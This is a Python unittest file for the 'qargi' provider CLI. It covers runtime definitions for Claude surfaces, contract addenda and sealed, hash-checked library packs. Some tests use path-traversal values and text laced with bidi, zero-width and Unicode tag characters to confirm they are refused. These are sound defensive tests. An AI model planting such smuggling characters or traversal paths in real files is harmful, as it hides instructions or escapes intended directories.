        self.assertEqual(self.of("str", "--surface", "cloud")[:2], (0, "claude-platform\n"))
        self.assertEqual(self.of("obj", "--surface", "local")[:2], (0, "fam-cli\n"))
        rc, out, err = self.run_cli("of", "--surface", "local", "fam", "--conf", self.conf)
        self.assertEqual((rc, out), (0, "fam-cli\n"))
        self.assertEqual(err, "qargi: note: models.provider is the single name 'fam'; on the local surface it resolves to fam-cli through the family. "
                              "Name a runtime for each surface: qargi project set fam models.provider.local fam-cli\n")

    def test_of_exits_2_for_an_unset_surface_an_ambiguous_family_and_a_project_with_none(self):
        rc, out, err = self.of("obj", "--surface", "cloud")
        self.assertEqual((rc, out, err), (2, "", "qargi: project obj has no cloud provider: set one with qargi project set obj models.provider.cloud NAME\n"))
        rc, out, err = self.of("none", "--surface", "local")
        self.assertEqual((rc, out, err), (2, "", "qargi: project none has no provider: set one with qargi project set none models.provider NAME\n"))
        rc, out, err = self.of("amb", "--surface", "cloud")
        self.assertEqual((rc, out), (2, ""))
        self.assertIn("more than one runtime on the cloud surface (fam-hosted, fam-other)", err)
        self.assertEqual(self.of("absent", "--surface", "local")[0], 2)

    def test_of_without_a_surface_is_what_it_was_and_refuses_the_object_form(self):
        self.assertEqual(self.of("str")[:2], (0, "claude\n"))
        rc, out, err = self.of("obj")
        self.assertEqual((rc, out), (2, ""))
        self.assertIn("names a runtime per surface", err)

    def test_of_with_a_bad_surface_or_option_is_a_usage_error(self):
        self.assertEqual(self.of("str", "--surface", "moon")[0], 2)
        self.assertEqual(self.of("str", "--surface")[0], 2)
        self.assertEqual(self.run_cli("of")[0], 2)


class V2Cli(CliBase):
    """list, show, check and effective on schema 2 definitions, shipped (the copy's providers/) and in the pack library."""

    def setUp(self):
        super().setUp()
        self.conf = os.path.join(self.tmp, "conf")
        self.state = os.path.join(self.tmp, "state")
        self.library = os.path.join(self.conf, "packs", "providers")
        os.makedirs(os.path.join(self.root, "catalogs"), exist_ok=True)
        os.makedirs(self.library)

    def run_cli(self, *args):
        env = dict(os.environ, QARGI_CONF=self.conf, QARGI_STATE=self.state)
        r = subprocess.run([sys.executable, "-I", os.path.join(self.copy, "provider.py")] + list(args), capture_output=True, text=True, env=env)
        return r.returncode, r.stdout, r.stderr

    def put_lib(self, name, d, files=None):
        os.makedirs(os.path.join(self.library, name), exist_ok=True)
        with open(os.path.join(self.library, name, "definition.json"), "w") as f:
            json.dump(d, f)
        for rel, mode in (files or {}).items():
            with open(os.path.join(self.library, name, rel), "w") as f:
                f.write("#!/bin/sh\n")
            os.chmod(os.path.join(self.library, name, rel), mode)
        hand_seal(os.path.join(self.library, name))

    def put_catalog(self, family):
        with open(os.path.join(self.root, "catalogs", family + ".json"), "w") as f:
            json.dump(catalog(family), f)

    def test_list_shows_every_definition_with_its_surfaces_and_marks_the_library(self):
        self.put("fakecli", runtime("fakecli"))
        self.put_lib("libcli", runtime("libcli", surface="cloud"))
        self.put("broken2", runtime("broken2", extra=1))
        self.put("lost", runtime("lost", models={"catalog": "gone", "use": "id"}))
        rc, out, _ = self.run_cli("list")
        rows = {ln.split()[0]: ln.split()[1:] for ln in out.strip().splitlines()}
        self.assertEqual((rc, list(rows)), (0, ["broken2", "claude-code", "claude-platform", "fakecli", "libcli", "lost"]))
        self.assertEqual(rows["fakecli"], ["local", "clean"])
        self.assertEqual(rows["libcli"], ["cloud", "clean", "(library)"])
        self.assertEqual(rows["broken2"][-1], "failure")
        self.assertEqual(rows["lost"][:2], ["local", "1"])

    def test_list_says_when_a_name_is_defined_twice(self):
        self.put("dupe", runtime("dupe"))
        self.put_lib("dupe", runtime("dupe"))
        rc, out, _ = self.run_cli("list")
        self.assertEqual(rc, 0)
        self.assertRegex(out, r"dupe\s+-\s+1 failure \('dupe' is defined twice")

    def test_show_a_definition_prints_models_effort_and_capabilities(self):
        self.put_catalog("fam")
        self.put("fam-cli", runtime("fam-cli", family="fam", models={"catalog": "fam", "use": "alias"},
                                    capabilities={"skills": cell("yes", "2026-11-02", "loads from .fake")}))
        rc, out, _ = self.run_cli("show", "fam-cli")
        self.assertEqual(rc, 0)
        self.assertIn("fam-cli  (local, shipped; family fam)", out)
        self.assertIn("models: catalog fam (2026-11-02), passes the alias", out)
        self.assertRegex(out, r"fast\s+fam-small\s+alias small")
        self.assertRegex(out, r"xhigh\s+- \(no control\)")
        self.assertRegex(out, r"skills\s+yes\s+verified 2026-11-02\s+loads from \.fake")
        rc, out, _ = self.run_cli("show", "fam-cli", "--json")
        self.assertEqual(json.loads(out)["models"], {"catalog": "fam", "use": "alias"})

    def test_show_a_library_definition_says_whether_the_record_backs_a_claim(self):
        self.put_lib("libcli", runtime("libcli", capabilities={"skills": cell("yes", "2026-11-02"), "mcp": cell("no", None)}))
        out = self.run_cli("show", "libcli")[1]
        self.assertIn("libcli  (local, library)", out)
        self.assertIn("single model my-model for every tier", out)
        self.assertRegex(out, r"effort\s*\n\s+no control")
        self.assertRegex(out, r"skills\s+yes\s+no record, counts as no")
        os.makedirs(os.path.join(self.state, "providers", "libcli"))
        with open(os.path.join(self.state, "providers", "libcli", "verified.json"), "w") as f:
            json.dump({"skills": {"hash": P.definition_hash("libcli", root=self.root, library=self.library), "by": "attest"}}, f)
        self.assertRegex(self.run_cli("show", "libcli")[1], r"skills\s+yes\s+verified by attest")

    def test_check_of_a_clean_definition(self):
        self.put("fakecli", runtime("fakecli"))
        rc, out, _ = self.run_cli("check", "fakecli")
        self.assertEqual(rc, 0)
        self.assertIn("fakecli: 0 failures, 0 warnings", out)
        self.assertIn("adapter: none (what needs one is refused)", out)
        self.assertIn("the review role cannot be served on local", out)
        self.assertRegex(out, r"local: skills\s+no")
        self.assertRegex(out, r"layout: project_skills_dir\s+no \(the verb that needs it is refused with exit 3\)")
        self.assertNotIn("cloud", out)

    def test_check_fails_for_a_violation_a_missing_catalog_and_a_clash(self):
        self.put("bad", runtime("bad", extra=1))
        self.put("lost", runtime("lost", models={"catalog": "gone", "use": "id"}))
        self.put("dupe", runtime("dupe"))
        self.put_lib("dupe", runtime("dupe"))
        rc, out, _ = self.run_cli("check", "bad")
        self.assertEqual(rc, 1)
        self.assertIn("fail: extra: additional property is not allowed", out)
        rc, out, _ = self.run_cli("check", "lost")
        self.assertEqual(rc, 1)
        self.assertIn("fail: models.catalog: no catalog 'gone'", out)
        rc, _, err = self.run_cli("check", "dupe")
        self.assertEqual(rc, 2)
        self.assertIn("'dupe' is defined twice", err)

    def test_check_looks_for_the_adapter_in_the_definitions_own_directory(self):
        self.put("withad", runtime("withad", adapter="adapter"))
        rc, out, _ = self.run_cli("check", "withad")
        self.assertEqual(rc, 1)
        self.assertIn("fail: adapter: adapter does not exist", out)
        os.makedirs(os.path.join(self.root, "withad"))
        ad = os.path.join(self.root, "withad", "adapter")
        with open(ad, "w") as f:
            f.write("#!/bin/sh\n")
        self.assertIn("fail: adapter: adapter is not executable", self.run_cli("check", "withad")[1])
        os.chmod(ad, 0o755)
        rc, out, _ = self.run_cli("check", "withad")
        self.assertEqual(rc, 0)
        self.assertIn("adapter: adapter (exists, executable)", out)
        self.put_lib("libad", runtime("libad", adapter="adapter"), {"adapter": 0o755})
        self.assertIn("adapter: adapter (exists, executable)", self.run_cli("check", "libad")[1])

    def test_check_and_addenda_look_for_the_contract_addenda_in_the_definitions_own_directory(self):
        self.put("withadd", runtime("withadd", surface="cloud", resources={"contract_addenda": ["add.md"]}))
        rc, out, _ = self.run_cli("check", "withadd")
        self.assertEqual(rc, 1)
        self.assertIn("fail: contract_addenda: add.md does not exist", out)
        rc, _, err = self.run_cli("addenda", "withadd", "cloud")
        self.assertEqual(rc, 1)
        self.assertIn("qargi: contract_addenda: add.md does not exist", err)
        os.makedirs(os.path.join(self.root, "withadd"))
        with open(os.path.join(self.root, "withadd", "add.md"), "w") as f:
            f.write("# Addendum\nline\n")
        rc, out, _ = self.run_cli("check", "withadd")
        self.assertEqual(rc, 0, out)
        self.assertEqual(self.run_cli("addenda", "withadd", "cloud"), (0, "# Addendum\nline\n", ""))
        self.assertEqual(self.run_cli("addenda", "claude-platform", "cloud")[0], 0)
        rc, out, _ = self.run_cli("addenda", "claude-code", "local")
        self.assertEqual(rc, 0)
        self.assertTrue(out.startswith("# In a Claude Code run\n"), out)
        self.assertEqual(self.run_cli("addenda", "withadd", "local")[0], 1)
        self.assertEqual(self.run_cli("addenda", "withadd")[0], 2)
        self.put_lib("libadd", runtime("libadd", surface="cloud", resources={"contract_addenda": ["add.md"]}), {"add.md": 0o644})
        self.assertEqual(self.run_cli("addenda", "libadd", "cloud"), (0, "#!/bin/sh\n", ""))

    def test_check_degrades_follow_the_record_for_a_library_definition(self):
        self.put_lib("libcli", runtime("libcli", capabilities={"skills": cell("yes", "2026-11-02"), "read_only_barrier": cell("yes", "2026-11-02")},
                                      barrier={"kind": "sandbox-args"}))
        out = self.run_cli("check", "libcli")[1]
        self.assertRegex(out, r"local: skills\s+unverified \(counts as no\)")
        self.assertIn("the review role cannot be served on local", out)
        os.makedirs(os.path.join(self.state, "providers", "libcli"))
        h = P.definition_hash("libcli", root=self.root, library=self.library)
        with open(os.path.join(self.state, "providers", "libcli", "verified.json"), "w") as f:
            json.dump({c: {"hash": h, "by": "conformance"} for c in ("skills", "read_only_barrier")}, f)
        out = self.run_cli("check", "libcli")[1]
        self.assertNotRegex(out, r"local: skills")
        self.assertNotIn("cannot be served", out)

    def test_effective_of_a_definition_and_of_the_other_surface(self):
        self.put("fakecli", runtime("fakecli", capabilities={"skills": cell()}))
        self.assertEqual(self.run_cli("effective", "fakecli", "local", "skills")[:2], (0, "yes\n"))
        self.assertEqual(self.run_cli("effective", "fakecli", "local", "mcp")[:2], (0, "no\n"))
        rc, _, err = self.run_cli("effective", "fakecli", "cloud", "skills")
        self.assertEqual(rc, 1)
        self.assertIn("the provider fakecli does not list the surface cloud", err)

    def test_the_other_verbs_work_on_a_definition_with_resources(self):
        res = {"skills": {"project_dir": ".fake/skills", "user_dir": "~/.fake/skills"}}
        self.put("fakecli", runtime("fakecli", resources=res, capabilities={"skills": cell()}, session={"launch": "fake {render}"}))
        self.assertEqual(self.run_cli("layout", "fakecli", "project_skills_dir")[:2], (0, ".fake/skills\n"))
        self.assertEqual(self.run_cli("require-skills", "fakecli")[0], 0)
        self.assertEqual(self.run_cli("launch", "fakecli", "/r")[:2], (0, "fake /r\n"))
        self.assertEqual(self.run_cli("skills-dirs")[1], ".claude/skills\n.fake/skills\n")
        rc, _, err = self.run_cli("layout", "fakecli", "project_agents_dir", "--would", "write")
        self.assertEqual((rc, err), (3, "qargi: provider fakecli has no project agents directory: write\n"))
        self.assertEqual(self.run_cli("require-barrier", "fakecli", "local")[0], 2)


class ShippedClaude(unittest.TestCase):
    """The shipped split of claude: catalogs/claude.json and the two runtimes claude-code (local) and claude-platform (cloud)."""

    RUNTIMES = (("claude-code", "local", "alias"), ("claude-platform", "cloud", "id"))

    def test_the_catalog_and_the_runtimes_have_no_failure(self):
        self.assertEqual([m for lvl, m in P.validate2(P.catalog("claude"), "claude") if lvl == "fail"], [])
        for name, surface, _ in self.RUNTIMES:
            with self.subTest(name):
                _, raw, findings = P.findings_of(name)
                self.assertEqual([m for lvl, m in findings if lvl == "fail"], [])
                self.assertEqual((raw["family"], raw["surface"], raw["models"]["catalog"]), ("claude", surface, "claude"))
                self.assertEqual(P.surfaces_of(name), [surface])

    def test_each_runtime_passes_the_alias_or_the_id_of_the_one_table(self):
        cat = P.catalog("claude")
        for name, surface, use in self.RUNTIMES:
            with self.subTest(name):
                m = P.models_of(name)
                self.assertEqual(m["use"], use)
                self.assertEqual({t: P.model_for(m, t) for t in P.TIERS}, {t: r["alias"] if use == "alias" else r["model"] for t, r in cat["tiers"].items()})
                self.assertEqual((m["pattern"], m["effort"]), (cat["pattern"], cat["effort"]))

    def test_claude_code_has_the_notes_the_skills_point_at_and_claude_platform_the_two_directories(self):
        notes = P.definition("claude-code")["notes"]
        self.assertEqual(sorted(notes), ["commands", "exploration", "identity", "member-out", "session-model", "skills-dir", "spawn"])
        self.assertIn("subagent_type", notes["spawn"])
        self.assertIn('{"skillOverrides": {"NAME": "off"}}', notes["skills-dir"])
        self.assertIn("Not verified", notes["identity"])                         # it says plainly what is not verified
        # the cloud runtime has no spawn notes; its two are the hosted directories lib/team.sh and lib/collect.sh ask for (provider notes --surface cloud)
        self.assertEqual(P.definition("claude-platform")["notes"], {"clone-dir": "/workspace", "output-dir": "/mnt/session/outputs"})

    def test_claude_code_carries_the_layout_the_agent_names_and_the_launch_line(self):
        self.assertEqual(P.layout("claude-code", home="/h")["user_skills_dir"], "/h/.claude/skills")
        self.assertEqual(P.summary("claude-code")["reserved_names"], CODE["agents"]["reserved_names"])
        self.assertEqual(P.launch_line("claude-code", "/r"), "claude --add-dir /r")
        self.assertEqual(P.definition("claude-code")["session"]["render_target"], "claude-code")

    def test_claude_platform_has_no_local_resources_only_its_contract_addendum(self):
        doc = P.definition("claude-platform")
        self.assertEqual((doc["resources"], doc["agents"]), ({"contract_addenda": ["cloud-run.md"]}, None))
        texts = P.contract_addenda("claude-platform", "cloud")
        self.assertEqual(len(texts), 1)
        self.assertTrue(texts[0].startswith("# In a cloud run\n"))
        self.assertIn("OUT is /mnt/session/outputs", texts[0])
        local = P.contract_addenda("claude-code", "local")           # the local runtime's own rules about its surface, delivered in the run's contract directory
        self.assertEqual(len(local), 1)
        self.assertTrue(local[0].startswith("# In a Claude Code run\n"))
        self.assertIn("run_in_background", local[0])
        self.assertEqual(P.definition("claude-code")["resources"]["contract_addenda"], ["local-run.md"])
        with self.assertRaises(P.Unsupported):
            P.require("claude-platform", "project_skills_dir", "link skills")

    def test_the_two_runtimes_serve_one_surface_each(self):
        with self.assertRaises(P.ProviderError):
            P.definition("claude-code", "cloud")
        with self.assertRaises(P.ProviderError):
            P.definition("claude-platform", "local")

    def test_the_string_claude_is_the_family_and_resolves_per_surface_with_the_family_notice(self):
        answers = {"models": {"provider": "claude"}}
        for name, surface, _ in self.RUNTIMES:
            with self.subTest(surface):
                runtime, notice = P.resolve_project(answers, surface, "alpha")
                self.assertEqual(runtime, name)
                self.assertIn("through the family", notice)
                self.assertIn("qargi project set alpha models.provider.%s %s" % (surface, name), notice)
        self.assertEqual(P.resolve_runtime("claude-code", "local"), "claude-code")
        self.assertEqual(P.provider_of({"models": {"provider": {"local": "claude-code", "cloud": "claude-platform"}}}, "cloud"), "claude-platform")
        with self.assertRaises(P.NoProvider):                            # the cloud runtime does not serve the local surface
            P.resolve_project({"models": {"provider": "claude-platform"}}, "local", "alpha")


class Addenda(V2Tree):
    """P.contract_addenda(): the texts a runtime's definition adds to the member contract, read from files inside its own directory."""

    def rt(self, *names, **over):
        d = runtime("cloudrt", surface="cloud", resources={"contract_addenda": list(names)}, **over)
        self.put("cloudrt", d)
        os.makedirs(os.path.join(self.root, "cloudrt"), exist_ok=True)
        return os.path.join(self.root, "cloudrt")

    def write(self, directory, rel, data):
        path = os.path.join(directory, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(data if isinstance(data, bytes) else data.encode())
        return path

    def refused(self, needle, *args, **kw):
        with self.assertRaises(P.ProviderError) as cm:
            P.contract_addenda("cloudrt", "cloud", **self.kw())
        self.assertIn(needle, str(cm.exception))

    def test_the_texts_come_in_the_order_the_definition_lists_them(self):
        d = self.rt("b.md", "sub/a.md")
        self.write(d, "b.md", "# B\nsecond\n")
        self.write(d, "sub/a.md", "# A\n")
        self.assertEqual(P.contract_addenda("cloudrt", "cloud", **self.kw()), ["# B\nsecond\n", "# A\n"])

    def test_a_definition_with_none_gives_none(self):
        self.put("cloudrt", runtime("cloudrt", surface="cloud"))
        self.assertEqual(P.contract_addenda("cloudrt", "cloud", **self.kw()), [])
        self.rt()
        self.assertEqual(P.contract_addenda("cloudrt", "cloud", **self.kw()), [])

    def test_a_surface_the_runtime_does_not_serve_is_refused(self):
        self.rt()
        with self.assertRaises(P.ProviderError) as cm:
            P.contract_addenda("cloudrt", "local", **self.kw())
        self.assertIn("does not list the surface local", str(cm.exception))

    def test_a_missing_file_a_directory_and_a_file_that_is_not_text_are_refused(self):
        d = self.rt("a.md")
        self.refused("contract_addenda: a.md does not exist")
        os.mkdir(os.path.join(d, "a.md"))
        self.refused("contract_addenda: a.md is not a file")
        os.rmdir(os.path.join(d, "a.md"))
        for data, why in ((b"text\x00more", "is not text"), (b"\xff\xfe bytes", "is not text"), (b"esc \x1b[2J", "is not text"),
                          ("bidi \u202e text".encode(), "is not text"), (b"\x7fELF\x02", "is not text"),
                          ("tag \U000e0041 char".encode(), "is not text"), ("zero\u200bwidth".encode(), "is not text"), ("bom \ufeff inside".encode(), "is not text"),
                          ("soft\u00adhyphen".encode(), "is not text"), ("private \ue000 use".encode(), "is not text"), ("unassigned \u0378".encode(), "is not text"),
                          ("line\u2028separator".encode(), "is not text"), (b"carriage\rreturn", "is not text"), (b"x" * (P.ADDENDUM_MAX + 1), "is longer than %d bytes" % P.ADDENDUM_MAX)):
            self.write(d, "a.md", data)
            self.refused("contract_addenda: a.md " + why)
        self.write(d, "a.md", "tab\tand\nnewline are text\n")
        self.assertEqual(P.contract_addenda("cloudrt", "cloud", **self.kw()), ["tab\tand\nnewline are text\n"])

    def test_a_path_that_leaves_the_directory_is_refused_even_through_a_link(self):
        d = self.rt("link.md")
        outside = self.write(self.tmp, "outside.md", "not mine\n")
        os.symlink(outside, os.path.join(d, "link.md"))
        self.refused("contract_addenda: link.md leaves the definition's directory")
        os.remove(os.path.join(d, "link.md"))
        self.write(d, "real.md", "mine\n")
        os.symlink("real.md", os.path.join(d, "link.md"))                    # a link that stays inside is only another name
        self.assertEqual(P.contract_addenda("cloudrt", "cloud", **self.kw()), ["mine\n"])
        self.rt("../outside.md")
        self.refused("resources.contract_addenda[0]: '../outside.md' is not a file inside the definition's directory")

    def test_check_reports_what_the_loader_would_refuse(self):
        d = self.rt("a.md")
        _, raw, _ = P.findings_of("cloudrt", **self.kw())
        self.assertEqual(P.addenda_problems(raw, d), ["contract_addenda: a.md does not exist"])
        self.write(d, "a.md", "ok\n")
        self.assertEqual(P.addenda_problems(raw, d), [])
        self.assertEqual(P.addenda_problems(runtime(), d), [])

    def test_a_library_pack_is_read_only_while_it_is_what_was_sealed(self):
        d = os.path.join(self.library, "libcloud")
        os.makedirs(d)
        with open(os.path.join(d, "definition.json"), "w") as f:
            json.dump(runtime("libcloud", surface="cloud", resources={"contract_addenda": ["a.md"]}), f)
        self.write(d, "a.md", "sealed text\n")
        hand_seal(d)
        self.assertEqual(P.contract_addenda("libcloud", "cloud", **self.kw()), ["sealed text\n"])
        self.write(d, "a.md", "changed after the seal\n")
        with self.assertRaises(P.Drift):
            P.contract_addenda("libcloud", "cloud", **self.kw())


class SealedPacks(V2Tree):
    """A library pack is used only while it is what was sealed: tree_hash, the record, seal_state, Drift, exec_copy, definition_hash."""

    def pack(self, name="libcli", doc=None, files=None, sealed=True, execs=()):
        """A library pack made by hand: definition.json and files, and a record that names the content hash when sealed."""
        d = os.path.join(self.library, name)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "definition.json"), "w") as f:
            json.dump(doc or runtime(name, capabilities={"skills": cell("yes", None)}), f)
        for rel, text in (files or {}).items():
            os.makedirs(os.path.dirname(os.path.join(d, rel)), exist_ok=True)
            with open(os.path.join(d, rel), "w") as f:
                f.write(text)
            os.chmod(os.path.join(d, rel), 0o755 if rel in execs else 0o644)
        rec = {"kind": "provider", "sealed": sealed}
        if sealed:
            rec.update(sha256=P.tree_hash(d), executables={x: self.sha(os.path.join(d, x)) for x in execs})
        with open(os.path.join(d, ".pack.json"), "w") as f:
            json.dump(rec, f)
        return d

    @staticmethod
    def sha(path):
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()

    def sstate(self, name="libcli"):
        return P.seal_state(P.entry_any(name, **self.kw()))[0]

    def test_the_hash_of_a_tree_ignores_the_record_and_sees_everything_else(self):
        d = self.pack(files={"a": "1", "b/c": "2"})
        h = P.tree_hash(d)
        with open(os.path.join(d, ".pack.json"), "w") as f:
            f.write("{}")
        self.assertEqual(P.tree_hash(d), h)
        def touch(*p):
            with open(os.path.join(d, *p), "w"):
                pass
        for change in (lambda: touch("b", "c"), lambda: os.chmod(os.path.join(d, "a"), 0o755), lambda: touch("new"), lambda: os.remove(os.path.join(d, "a"))):
            before = P.tree_hash(d)
            change()
            self.assertNotEqual(P.tree_hash(d), before)

    def test_the_notes_of_a_pack_are_in_its_seal_and_in_the_hash_a_verification_is_bound_to(self):
        doc = runtime("notep", notes={"spawn": "Start it."})
        d = self.pack("notep", doc)
        self.assertEqual(P.definition("notep", **self.kw())["notes"], {"spawn": "Start it."})
        before = P.definition_hash("notep", **self.kw())
        doc["notes"]["spawn"] = "Start it differently."                    # an edit of a note after the seal: the pack is not what was approved
        with open(os.path.join(d, "definition.json"), "w") as f:
            json.dump(doc, f)
        self.assertEqual(self.sstate("notep"), "drift")
        with self.assertRaises(P.Drift):
            P.definition("notep", **self.kw())
        self.pack("notep", doc)                                             # sealed again with the new note: a verification made before no longer matches
        self.assertNotEqual(P.definition_hash("notep", **self.kw()), before)

    def test_a_sealed_pack_loads_an_unsealed_or_changed_one_is_drift_and_so_is_one_with_no_record(self):
        self.pack("sealedp")
        self.assertEqual(self.sstate("sealedp"), "sealed")
        self.assertEqual(P.definition("sealedp", **self.kw())["provider"], "sealedp")
        self.pack("freshp", sealed=False)
        self.assertEqual(self.sstate("freshp"), "unsealed")
        with self.assertRaises(P.Drift) as cm:
            P.definition("freshp", **self.kw())
        self.assertIn("is not sealed; qargi provider check freshp, then qargi provider seal freshp", str(cm.exception))
        self.assertIsInstance(cm.exception, P.Refused)                               # exit 2, like a name that is defined twice
        d = self.pack("changedp")
        with open(os.path.join(d, "extra.txt"), "w") as f:
            f.write("added after the seal")
        self.assertEqual(self.sstate("changedp"), "drift")
        with self.assertRaises(P.Drift):
            P.definition("changedp", **self.kw())
        d = self.pack("handp")
        os.remove(os.path.join(d, ".pack.json"))
        self.assertEqual(self.sstate("handp"), "unrecorded")
        with self.assertRaises(P.Drift) as cm:                                      # a file put there by hand was never read or approved: it is not used
            P.definition("handp", **self.kw())
        self.assertIn("has no record (put there by hand)", str(cm.exception))
        self.assertIn("qargi provider seal handp", str(cm.exception))
        self.assertIn("qargi provider import", str(cm.exception))
        with self.assertRaises(P.Drift):
            P.definition("handp", **self.kw())
        with self.assertRaises(P.Drift):
            P.definition_hash("handp", **self.kw())
        with self.assertRaises(P.Drift):
            P.exec_copy("handp", "adapter", **self.kw())
        d = self.pack("brokenp")
        with open(os.path.join(d, ".pack.json"), "w") as f:
            f.write("not json")
        self.assertEqual(self.sstate("brokenp"), "drift")

    def test_a_catalog_is_sealed_like_a_runtime(self):
        d = os.path.join(self.library, "famcat")
        os.makedirs(d)
        with open(os.path.join(d, "definition.json"), "w") as f:
            json.dump(catalog("famcat"), f)
        with open(os.path.join(d, ".pack.json"), "w") as f:
            json.dump({"kind": "catalog", "sealed": False}, f)
        with self.assertRaises(P.Drift):
            P.catalog("famcat", **self.kw())
        with open(os.path.join(d, ".pack.json"), "w") as f:
            json.dump({"kind": "catalog", "sealed": True, "sha256": P.tree_hash(d)}, f)
        self.assertEqual(P.catalog("famcat", **self.kw())["family"], "famcat")

    def test_the_definition_hash_covers_the_pack_so_an_edited_script_stales_a_record(self):
        d = self.pack(files={"adapter": "#!/bin/sh\n"}, execs=("adapter",))
        h = P.definition_hash("libcli", **self.kw())
        with open(os.path.join(d, "adapter"), "w") as f:
            f.write("#!/bin/sh\necho changed\n")
        with open(os.path.join(d, ".pack.json")) as f:
            rec = json.load(f)
        rec["sha256"] = P.tree_hash(d)                                              # sealed again, definition.json untouched
        with open(os.path.join(d, ".pack.json"), "w") as f:
            json.dump(rec, f)
        self.assertNotEqual(P.definition_hash("libcli", **self.kw()), h)

    def test_exec_copy_is_a_private_copy_of_what_was_approved_and_refuses_the_rest(self):
        self.pack(files={"adapter": "#!/bin/sh\necho ok\n", "other": "#!/bin/sh\n"}, execs=("adapter",))
        copy, path = P.exec_copy("libcli", "adapter", **self.kw(tmp=self.tmp))
        self.addCleanup(shutil.rmtree, os.path.dirname(copy), True)
        self.assertEqual(os.path.basename(path), "adapter")
        self.assertTrue(os.access(path, os.X_OK))
        self.assertEqual(stat.S_IMODE(os.stat(os.path.dirname(copy)).st_mode), 0o700)
        for rel in ("other", "../adapter", "/bin/sh", "nosuch"):
            with self.assertRaises(P.Refused, msg=rel):
                P.exec_copy("libcli", rel, **self.kw())
        with self.assertRaises(P.Refused):
            P.exec_copy("claude-code", "adapter")                                   # shipped: part of the tool, not a library pack
        with open(os.path.join(self.library, "libcli", "adapter"), "a") as f:
            f.write("echo drift\n")
        with self.assertRaises(P.Drift):
            P.exec_copy("libcli", "adapter", **self.kw())

    def test_exec_copy_checks_the_executables_own_hash_against_the_record(self):
        d = self.pack(files={"adapter": "#!/bin/sh\n"}, execs=("adapter",))
        with open(os.path.join(d, ".pack.json")) as f:
            rec = json.load(f)
        rec["executables"]["adapter"] = "0" * 64
        with open(os.path.join(d, ".pack.json"), "w") as f:
            json.dump(rec, f)
        with self.assertRaises(P.Drift):
            P.exec_copy("libcli", "adapter", **self.kw())

    def test_definitions_unsealed_shows_what_an_unusable_pack_names(self):
        self.pack("freshp", sealed=False, doc=runtime("freshp", resources={"skills": {"project_dir": ".fresh/skills", "items": "dir-per-item", "entry": "SKILL.md"}}))
        self.assertEqual(P.definitions_unsealed("freshp", **self.kw())["local"]["resources"]["skills"]["project_dir"], ".fresh/skills")
        with self.assertRaises(P.ProviderError):
            P.definitions_unsealed("nosuch", **self.kw())

    def test_an_extension_has_its_own_rules(self):
        good = {"schema": 2, "kind": "extension", "extension": "addon", "extends": "libcli", "provides": ["resume"],
                "adds": {"capabilities": {"resume": cell("yes")}, "adapter_verbs": {"resume": "verbs/resume"}}}
        self.assertEqual(P.validate2(good, "addon"), [])
        for mutate, needle in ((lambda d: d.update(extra=1), "extra: additional property is not allowed"), (lambda d: d.update(extension="Bad"), "extension: 'Bad' is not a name"),
                               (lambda d: d.update(extension="other"), "extension 'other' differs from the file name 'addon'"),
                               (lambda d: d.update(extends="../x"), "extends: '../x' is not a runtime or family name"),
                               (lambda d: d.update(provides=["resume", "nosuch"]), "provides: unknown capability 'nosuch'"),
                               (lambda d: d.update(provides=["skills"]), "provides must equal the capability names of adds.capabilities (resume)"),
                               (lambda d: d["adds"]["capabilities"]["resume"].update(value="maybe"), "adds.capabilities.resume: a cell"),
                               (lambda d: d["adds"].update(adapter_verbs={"resume": "../x"}), "adds.adapter_verbs"),
                               (lambda d: d.update(adds="x"), "adds: an object"), (lambda d: d.update(schema=1), "schema: 1 is not the supported version 2")):
            d = copy.deepcopy(good)
            mutate(d)
            self.assertTrue(any(needle in m for lvl, m in P.validate2(d, "addon") if lvl == "fail"), (needle, P.validate2(d, "addon")))

    def test_record_verification_writes_atomically_with_private_modes_and_an_empty_map_removes_it(self):
        f = P.record_verification("libcli", {"skills": {"hash": "h", "by": "conformance", "at": "t", "note": ""}}, state=self.state)
        self.assertEqual(P.verification("libcli", self.state)["skills"]["by"], "conformance")
        self.assertEqual(stat.S_IMODE(os.stat(f).st_mode), 0o600)
        self.assertEqual(stat.S_IMODE(os.stat(os.path.dirname(f)).st_mode), 0o700)
        self.assertEqual(os.listdir(os.path.dirname(f)), ["verified.json"])
        P.record_verification("libcli", {}, state=self.state)
        self.assertFalse(os.path.exists(f))
        P.record_verification("libcli", {}, state=self.state)                      # nothing to remove is not an error


# ---- the library verbs: new, import, seal, check, attest, remove, enable, disable ------------------------------------------------

def jread(path):
    with open(path) as f:
        return json.load(f)


def jwrite(path, obj):
    with open(path, "w") as f:
        json.dump(obj, f)


def fread(path):
    with open(path) as f:
        return f.read()


def fwrite(path, text):
    with open(path, "w") as f:
        f.write(text)



SKILLS_RES = {"skills": {"project_dir": ".fake/skills", "items": "dir-per-item", "entry": "SKILL.md", "format": "skill-md",
                         "link": {"project": "dir-symlink", "user": "none"}}}
RENDERER = "#!/usr/bin/env python3\nimport json, sys\nd = json.load(sys.stdin)[\"definition\"]\nprint(\"---\\nname: %s\\n---\\n\\n%s\" % (d[\"name\"], d.get(\"body\", \"\")))\n"


def fake_runtime(name="fakecli", **over):
    """A data-only runtime that claims skills and mcp (skills has a hermetic case; mcp has none)."""
    d = runtime(name, capabilities={"skills": {"value": "yes", "note": "n"}, "mcp": {"value": "yes"}}, resources=SKILLS_RES)
    d.update(over)
    return d


class LibraryBase(unittest.TestCase):
    """The verbs run as the command line runs them (lib/provider.py), against a temporary configuration and state."""

    def setUp(self):
        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix="libverbs."))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.conf, self.state, self.home, self.src = (os.path.join(self.tmp, d) for d in ("conf", "state", "home", "src"))
        for d in (self.home, self.src):
            os.makedirs(d)
        self.env = {k: v for k, v in os.environ.items() if not k.startswith(("QARGI_", "ANTHROPIC_"))}
        self.env.update(HOME=self.home, QARGI_CONF=self.conf, QARGI_STATE=self.state)
        self.lib = os.path.join(self.conf, "packs", "providers")
        self.patches = [mock.patch.dict(os.environ, {"QARGI_CONF": self.conf, "QARGI_STATE": self.state, "HOME": self.home})]
        for m in self.patches:
            m.start()
            self.addCleanup(m.stop)

    def q(self, *args):
        r = subprocess.run([sys.executable, "-I", os.path.join(LIB, "provider.py")] + [str(a) for a in args], capture_output=True, text=True, env=self.env,
                           stdin=subprocess.DEVNULL, cwd=self.tmp)
        return r.returncode, r.stdout, r.stderr

